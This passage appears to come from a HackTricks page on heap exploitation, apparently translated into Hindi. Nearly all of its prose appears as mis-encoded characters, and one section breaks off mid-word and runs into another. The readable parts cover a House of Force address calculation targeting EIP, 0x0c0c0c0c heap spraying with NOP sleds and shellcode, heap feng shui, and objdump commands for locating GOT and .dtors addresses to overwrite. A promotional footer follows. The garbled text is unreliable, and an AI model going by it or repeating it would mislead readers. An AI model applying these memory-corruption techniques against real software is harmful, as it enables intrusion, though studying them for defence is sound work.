рд╡рд┐рдХреНрдЯрд┐рдо рд╡рд╛рдЗрд▓реНрдбрд░реНрдиреЗрд╕ рдЯреБрдХрдбрд╝реЗ рдХреЗ рдкрддреЗ рдХрд╛ рдорд╛рди (рд╡рд░реНрддрдорд╛рди av->top) рдХреЛ рд▓реЗрддрд╛ рд╣реИ рдФрд░ рд╢реЗрд╖ рдмрдЪрдд рдЙрд╕ рдкрддреЗ рдХреЗ рд╕рдВрдпреЛрдЬрди рдФрд░ malloc() рджреНрд╡рд╛рд░рд╛ рдорд╛рдВрдЧреЗ рдЧрдП рдмрд╛рдЗрдЯреНрд╕ рдХреЗ рдпреЛрдЧ рдХреЗ рдмрд░рд╛рдмрд░ рд╣реЛрддрд╛ рд╣реИред рдЗрд╕рд▓рд┐рдП рдпрджрд┐ \&EIP-8 0xbffff224 рдореЗрдВ рд╣реИ рдФрд░ av->top рдореЗрдВ 0x080c2788 рд╣реИ, рддреЛ malloc() рдХреЗ рд▓рд┐рдП рдЖрд╡рдВрдЯрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рдпрдВрддреНрд░рдг рдореЗрдВ рд░рдЦрдиреЗ рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ рдмрд╛рдЗрдЯреНрд╕ рдХреА рдорд╛рддреНрд░рд╛ рд╣реЛрдЧреА:

0xbffff224 - 0x080c2788 = 3086207644ред

рдЗрд╕ рддрд░рд╣ рдмрджрд▓реЗ рдЧрдП рдорд╛рди рдХреЛ av->top рдореЗрдВ рд╕рд╣реЗрдЬрд╛ рдЬрд╛рдПрдЧрд╛ рдФрд░ рдЕрдЧрд▓реЗ malloc() рдХреЛ EIP рдХрд╛ рдкрддрд╛ рджрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ рдФрд░ рдЗрд╕реЗ рдУрд╡рд░рдлрд╝реНрд▓реЛ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗрдЧрд╛ред

рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИ рдХрд┐ рдирдП wilderness рдЯреБрдХрдбрд╝реЗ рдХрд╛ рдЖрдХрд╛рд░ рдЙрд╕ рдЕрдиреБрд░реЛрдз рд╕реЗ рдЕрдзрд┐рдХ рд╣реЛ, рдЬреЛ рдкрд┐рдЫрд▓реЗ malloc() рджреНрд╡рд╛рд░рд╛ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред рдЕрд░реНрдерд╛рддреН, рдпрджрд┐ wilderness \&EIP-8 рдХреА рдУрд░ рдЗрд╢рд╛рд░рд╛ рдХрд░ рд░рд╣рд╛ рд╣реИ, рддреЛ рд╕рд╛рдЗрдЬрд╝ рд╕реНрдерд╛рдирдХ рдХреНрд╖реЗрддреНрд░ рдореЗрдВ рдмрд┐рд▓реНрдХреБрд▓ рд░рд╣реЗрдЧрд╛ред

**рд▓реЛрд░ рдХрд╛ рдШрд░**

**SmallBin рдХрд╛ рджреВрд╖рдг**

рдореБрдХреНрдд рдХрд┐рдП рдЧрдП рдЯреБрдХрдбрд╝реЗ рдЕрдкрдиреЗ рдЖрдХрд╛рд░ рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рдмрд┐рди рдореЗрдВ рдбрд╛рд▓реЗ рдЬрд╛рддреЗ рд╣реИрдВред рд▓реЗрдХрд┐рди рдЙрдиреНрд╣реЗрдВ рдмрд┐рди рдореЗрдВ рдбрд╛рд▓рдиреЗ рд╕реЗ рдкрд╣рд▓реЗ рд╡реЗ unsorted bins рдореЗрдВ рд╕рд╣реЗрдЬреЗ рдЬрд╛рддреЗ рд╣реИрдВред рдПрдХ рдЯреБрдХ
рдпрд╣ рдореВрд▓ рд░реВрдк рд╕реЗ рд╣реАрдкреНрд╕ рдХреЗ рд▓рд┐рдП рд╕рдВрднрд╛рд╡рд┐рдд рд╕рднреА рдореЗрдореЛрд░реА рдХреЛ рдЖрд░рдХреНрд╖рд┐рдд рдХрд░рдиреЗ рдФрд░ рдЗрдиреНрд╣реЗрдВ рдиреЙрдкреНрд╕ рдХреЗ рд╕рд╛рде рднрд░рдиреЗ рдХрд╛ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ, рдЬрд┐рдиреНрд╣реЗрдВ рд╢реЗрд▓рдХреЛрдб рд╕реЗ рд╕рдорд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдПрдХ рдХреЛрд▓реНрдЪрди рдХреЗ рд░реВрдк рдореЗрдВ 0x0c рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдЗрд╕рд▓рд┐рдП, рд╣рдо 0x0c0c0c0c рдкрддреЗ рдкрд░ рдЫрд▓рд╛рдВрдЧ рд▓рдЧрд╛рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВрдЧреЗ, рдФрд░ рдЗрд╕ рдкреНрд░рдХрд╛рд░, рдпрджрд┐ рдХреЛрдИ рдРрд╕рд╛ рдкрддрд╛ рдЕрдзрд┐рдХрд╛рд░рд┐рдд рд╣реЛ рдЬрд┐рд╕реЗ рдЗрд╕ рдХреЛрд▓реНрдЪрди рдХреЗ рд╕рд╛рде рдмреБрд▓рд╛рдпрд╛ рдЬрд╛рдПрдЧрд╛, рддреЛ рд╡рд╣рд╛рдВ рдЫрд▓рд╛рдВрдЧ рд▓рдЧрд╛рдИ рдЬрд╛рдПрдЧреАред рдореВрд▓ рд░реВрдк рд╕реЗ рдпрд╣ рдпреЛрдЬрдирд╛ рд╣реИ рдХрд┐ рд╣рдо рдЬрд┐рддрдирд╛ рд╕рдВрднрд╡ рд╣реЛ рд╕рдХреЗ рдЖрд░рдХреНрд╖рд┐рдд рдХрд░реЗрдВ рддрд╛рдХрд┐ рд╣рдо рджреЗрдЦ рд╕рдХреЗрдВ рдХрд┐ рдХреНрдпрд╛ рдХреЛрдИ рдкреЙрдЗрдВрдЯрд░ рдЕрдзрд┐рдХрд╛рд░рд┐рдд рд╣реЛ рд░рд╣рд╛ рд╣реИ рдФрд░ 0x0c0c0c0c рдкрд░ рдЫрд▓рд╛рдВрдЧ рд▓рдЧрд╛рдПрдБ рдФрд░ рдЙрдореНрдореАрдж рдХрд░реЗрдВ рдХрд┐ рд╡рд╣рд╛рдВ рдиреЙрдкреНрд╕ рд╣реЛрдВред

**рд╣реАрдк рдлреЗрдВрдЧ рд╢реБрдИ**

рдпрд╣ рдореЗрдореЛрд░реА рдХреЛ рдмреАрдЪ рдореЗрдВ рдЖрд░рдХреНрд╖рд┐рдд рдЯреБрдХрдбрд╝реЛрдВ рдХреЗ рдмреАрдЪ рдмреЛрдиреЗ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдореЗрдореЛрд░реА рдХреЛ рдмреАрдЬ рдмреЛрдиреЗ рдХрд╛ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИред рдмрдлрд░ рдУрд╡рд░рдлрд╝реНрд▓реЛ рдХреЛ рдПрдХ рдЕрдВрдбреЗ рдореЗрдВ рд╕реНрдерд╛рдирд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред

**objdump -d executable** тАФ> рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдбрд┐рд╕рдЕрд╕ рдХрд░реЗрдВ\
**objdump -d ./PROGRAMA | grep FUNCTION** тАФ> рдлрд╝рдВрдХреНрд╢рди рдкрддрд╛ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ\
**objdump -d -Mintel ./shellcodeout** тАФ> рдпрд╣ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐ рдпрд╣ рд╣рдорд╛рд░рд╛ рд╢реЗрд▓рдХреЛрдб рд╣реИ рдФрд░ рдСрдкрдХреЛрдбреНрд╕ рдХреЛ рдирд┐рдХрд╛рд▓реЗрдВ\
**objdump -t ./exec | grep varBss** тАФ> рд╕рдВрдХреЗрдд рд╕реВрдЪреА, рдЪрд░ рдФрд░ рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдкрддрд╛ рдирд┐рдХрд╛рд▓рдиреЗ рдХреЗ рд▓рд┐рдП\
**objdump -TR ./exec | grep exit(func lib)** тАФ> рд▓рд╛рдЗрдмреНрд░реЗрд░реА рдХреЗ рдлрд╝рдВрдХреНрд╢рдиреЛрдВ рдХрд╛ рдкрддрд╛ рдирд┐рдХрд╛рд▓рдиреЗ рдХреЗ рд▓рд┐рдП (GOT)\
**objdump -d ./exec | grep funcCode**\
**objdump -s -j .dtors /exec**\
**objdump -s -j .got ./exec**\
**objdump -t --dynamic-relo ./exec | grep puts** тАФ> GOT рдореЗрдВ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреБрдЯреНрд╕ рдХрд╛ рдкрддрд╛ рдирд┐рдХрд╛рд▓реЗрдВ\
**objdump -D ./exec** тАФ> рдкреАрдПрд▓рдЯреА рдХреЗ рдкреНрд░рд╡реЗрд╢ рддрдХ рд╕рднреА рдХреЛ рдбрд┐рд╕рдЕрд╕ рдХрд░реЗрдВ\
**objdump -p -/exec**\
**Info functions strncmp тАФ>** gdb рдореЗрдВ рдлрд╝рдВрдХреНрд╢рди рдХреА рдЬрд╛рдирдХрд╛рд░реА

## рджрд┐рд▓рдЪрд╕реНрдк рдкрд╛рдареНрдпрдХреНрд░рдо

* [https://guyinatuxedo.github.io/](https://guyinatuxedo.github.io)
* [https://github.com/RPISEC/MBE](https://github.com/RPISEC/MBE)

## **рд╕рдВрджрд░реНрдн**

* [**https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html**](https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк рдХрд┐рд╕реА **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рдХреА рдЬрд╛рдП? рдпрд╛ рдХреНрдпрд╛ рдЖрдк **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб** рдХрд░рдиреЗ рдХрд╛ рдЙрджреНрджреЗрд╢реНрдп рд░рдЦрддреЗ рд╣реИрдВ? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFT**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks swag**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рдореБрдЭреЗ **рдЯреНрд╡рд┐рдЯрд░** [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)** рдХрд╛** рдЕрдиреБрд╕рд░рдг рдХрд░реЗрдВред
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рдХреЛ рд╣рдореЗрдВ PR рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **рдФрд░** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВред**

</details>
